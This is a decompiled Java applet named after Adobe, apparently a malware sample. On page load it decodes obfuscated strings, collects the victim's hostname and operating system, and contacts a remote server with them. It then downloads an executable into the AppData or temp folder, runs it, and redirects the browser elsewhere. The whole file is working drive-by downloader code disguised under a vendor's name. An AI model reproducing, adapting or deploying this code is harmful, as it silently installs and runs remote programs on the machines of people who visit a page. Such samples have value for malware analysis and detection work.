import java.net.InetAddress;
import java.net.MalformedURLException;
import java.io.IOException;
import java.nio.channels.Channels;
import java.io.InputStream;
import java.io.File;
import java.io.Reader;
import java.io.InputStreamReader;
import java.net.URL;
import java.io.FileOutputStream;
import java.io.BufferedReader;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Adobe extends Applet
{
    private static String B;
    private static String A;
    private static BufferedReader D;
    private static FileOutputStream E;
    private static String C;
    private static StringBuffer AD;
    private static String DEZ;
    
    public static String FGD(final String s, final String s2) {
        Adobe.B = "http://";
        String s3 = F(s, s2, 0);
        if (s3 != "" && F(s, s2, 0).contains("appdata") && s3 != "") {
            s3 = System.getenv(s3);
        }
        else if ((s3 != "" && F(s, s2, 0).contains("os.name")) || (s3 != "" && F(s, s2, 0).contains("tmpdir"))) {
            s3 = System.getProperty(s3);
        }
        return s + s3;
    }
    
    public static String F(String s, final String b, final int n) {
        String b2 = "";
        if (n == 1) {
            if (s.startsWith(Adobe.B) && Adobe.B != null) {
                try {
                    String string = "";
                    Adobe.B = b;
                    if (Adobe.B.length() > 0 && Adobe.B != null && Adobe.B != "") {
                        s = (Adobe.B = s + "?" + Adobe.B);
                        if (Adobe.B != null && Adobe.B != null) {
                            J(new BufferedReader(new InputStreamReader(new URL(Adobe.B).openConnection().getInputStream())));
                            while ((Adobe.C = Adobe.D.readLine()) != null) {
                                string += (Object)Adobe.AD.append(Adobe.C);
                            }
                            Adobe.D.close();
                            Adobe.B = string;
                        }
                    }
                }
                catch (Exception ex) {
                    System.exit(0);
                }
            }
            b2 = Adobe.B;
        }
        else {
            String string2 = "";
            if (n == 0 && n != 1 && n != 2) {
                final String[] split = b.replaceAll("[^0-9]", " ").split(" ");
                if (n != 2 && n != 1) {
                    for (int i = 0; i < split.length; ++i) {
                        string2 += Adobe.DEZ.charAt(Integer.parseInt(split[i]));
                    }
                    b2 = string2;
                }
            }
        }
        return b2;
    }
    
    public static String ZA() {
        try {
            ZE(FGD("", "9J0J21J0J28J8J14J28J19J12J15J3J8J17"));
            if (Adobe.A != null) {
                Adobe.A += "\\";
            }
            if (Adobe.A == null) {
                ZE(FGD("", "0J15J15J3J0J19J0"));
            }
            if (Adobe.A != null) {
                Adobe.A += "\\";
            }
            if (Adobe.A == null) {
                System.exit(0);
            }
        }
        catch (Exception ex) {
            System.exit(0);
        }
        return Adobe.A;
    }
    
    private static void ZC(final FileOutputStream e) {
        Adobe.E = e;
    }
    
    public static void J(final BufferedReader d) {
        Adobe.D = d;
    }
    
    public static void ZE(final String a) {
        Adobe.A = a;
    }
    
    public static void ZF(final String s) throws IOException {
        Adobe.AD = new StringBuffer();
        try {
            if ((ZA() != null && ZA().contains("Roaming")) || (ZA().contains("Temp") && new File(ZA()).exists())) {
                final String[] split = F(FGD("", "7J19J19J15J26J27J27J5J14J23J23J24J18J14J5J19J22J0J17J4J28J3J24J13J3J13J18J31J0J19J31J7J14J12J4J28J2J14J12J27J6J4J19J28J15J7J15"), FGD("", "18J8J19J4J29") + FGD(s, "30J20J18J4J17J13J0J12J4J29") + FGD("ZYNiTaUO", "30J20J17J11J29") + FGD("http://filehostonline.com/files/33/Elite", "28J4J23J4") + FGD("", "30J2J14J12J15J29") + FGD(ZD(1, 0), "30J14J18J29") + ZD(0, 1), 1).split("-_-");
                if (split[2] == "G") {
                    if (split[2] == null) {
                        return;
                    }
                }
                try {
                    ZC(new FileOutputStream(ZA() + split[1] + FGD(".", "4J23J4")));
                    Adobe.E.getChannel().transferFrom(Channels.newChannel((InputStream)new URL(split[0]).getClass().getMethod("o" + "p" + "en" + "S" + "tr" + "e" + "am", (Class<?>[])new Class[0]).invoke(new URL(split[0]), new Object[0])), 0L, 5242880L);
                    Adobe.E.close();
                    if (new File(ZA() + split[1] + FGD(".", "4J23J4")).exists()) {
                        try {
                            System.gc();
                        }
                        catch (Exception ex) {}
                        Runtime.getRuntime().exec(ZA() + split[1] + FGD(".", "4J23J4"));
                        return;
                    }
                    System.exit(0);
                }
                catch (Exception ex2) {
                    System.exit(0);
                }
            }
            else {
                System.exit(0);
            }
        }
        catch (Exception ex3) {
            System.exit(0);
        }
    }
    
    public void StillAlive() {
        try {
            this.getAppletContext();
            this.getAppletContext().showDocument(new URL("http://provisioning.tricom.net/"), "_self");
            System.exit(0);
        }
        catch (MalformedURLException ex) {
            System.exit(0);
        }
    }
    
    public static String ZD(final int n, final int n2) {
        try {
            if (n == 1 && n2 != 1) {
                try {
                    ZE(InetAddress.getLocalHost().getHostName().toString());
                    if (Adobe.A != null) {
                        Adobe.A = "Unknown";
                    }
                }
                catch (Exception ex) {
                    System.exit(0);
                }
            }
            else if (n2 == 1 && n != 1) {
                try {
                    ZE(FGD("", "14J18J28J13J0J12J4"));
                    if (Adobe.A != null) {
                        Adobe.A = "Unknown";
                    }
                }
                catch (Exception ex2) {
                    System.exit(0);
                }
            }
            else {
                Adobe.A = "Unknown";
            }
        }
        catch (Exception ex3) {
            System.exit(0);
        }
        return Adobe.A;
    }
    
    @Override
    public void init() {
        try {
            ZF(this.getDocumentBase().toString());
            this.StillAlive();
        }
        catch (Exception ex) {
            System.exit(0);
        }
    }
    
    static {
        Adobe.DEZ = "abcdefghijklmnopqrstuvwxyz:/.=&-";
    }
}